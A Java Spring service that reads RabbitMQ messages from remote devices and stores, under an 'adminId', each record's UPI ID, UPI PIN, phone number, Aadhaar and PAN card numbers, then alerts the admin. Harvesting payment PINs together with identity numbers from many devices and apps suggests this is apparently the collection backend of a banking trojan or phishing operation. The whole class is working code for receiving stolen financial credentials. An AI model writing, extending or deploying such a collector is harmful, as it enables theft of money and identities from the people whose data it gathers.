package app.service.service;

import app.service.model.VpaRecord;
import app.service.store.VpaStore;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.amqp.rabbit.annotation.RabbitListener;
import org.springframework.stereotype.Service;

import java.time.Instant;

@Service
public class VpaProcessor {

    private static final Logger log = LoggerFactory.getLogger(VpaProcessor.class);

    private final VpaStore store;
    private final ObjectMapper mapper;
    private final AdminNotifier notifier;

    public VpaProcessor(VpaStore store, ObjectMapper mapper, AdminNotifier notifier) {
        this.store = store; this.mapper = mapper; this.notifier = notifier;
    }

    @RabbitListener(queues = "${app.queue}")
    public void onMessage(String body) {
        try {
            JsonNode root = mapper.readTree(body);
            String adminId = text(root, "data.adminId");
            String deviceId = text(root, "sender.deviceId");
            String appId = text(root, "sender.appId");
            if (appId==null || appId.isBlank()) appId = "unknown";
            if (deviceId==null || deviceId.isBlank()) deviceId = "unknown";

            JsonNode arr = root.at("/data/payload/vpa");
            int processed = 0;
            java.util.List<VpaRecord> snapshot = new java.util.ArrayList<>();
            if (arr != null && arr.isArray()) {
                for (JsonNode it : arr) {
                    String upiId = asString(it.get("upi_id"));
                    String upiPin = asPin(it.get("upi_pin")); // keep as string; support 4 or 6 digits
                    String phone = asString(it.get("phone_number"));
                    String adhar = asString(it.get("adhar_card"));
                    String pan = asString(it.get("pan_card"));
                    long eventTs = parseInstant(it.get("eventTimestamp"));

                    VpaRecord rec = VpaRecord.builder()
                            .adminId(adminId)
                            .appId(appId)
                            .deviceId(deviceId)
                            .upiId(emptyToNull(upiId))
                            .upiPin(emptyToNull(upiPin))
                            .phoneNumber(emptyToNull(phone))
                            .adharCard(emptyToNull(adhar))
                            .panCard(emptyToNull(pan))
                            .eventTimestampMs(eventTs)
                            .build();
                    snapshot.add(rec);
                    processed++;
                }
            }
            store.replaceAll(appId, adminId, deviceId, snapshot);
            log.info("vpa: processed={} admin={} appId={} device={}", processed, adminId, appId, deviceId);
            if (processed > 0) notifier.notifyRefresh(adminId, "refresh.vpa");
        } catch (Exception e) {
            log.warn("vpa: failed to process message: {}", e.toString());
        }
    }

    private String text(JsonNode root, String path) {
        String[] ps = path.split("\\.");
        JsonNode cur = root;
        for (String p : ps) cur = cur.path(p);
        return cur.isMissingNode()?null:cur.asText();
    }

    private String asString(JsonNode n){ return (n==null||n.isNull())?null:n.asText(); }
    private long parseInstant(JsonNode n){ try { return Instant.parse(n.asText()).toEpochMilli(); } catch(Exception e){ return System.currentTimeMillis(); } }
    private static String emptyToNull(String s){ return (s==null||s.isBlank())?null:s; }

    private String asPin(JsonNode n){
        if (n==null || n.isNull()) return null;
        String s = n.asText();
        s = s.trim();
        // accept exactly 4 or 6 digits; otherwise store as-is
        if (s.matches("^\\d{4}$") || s.matches("^\\d{6}$")) return s;
        return s;
    }
}
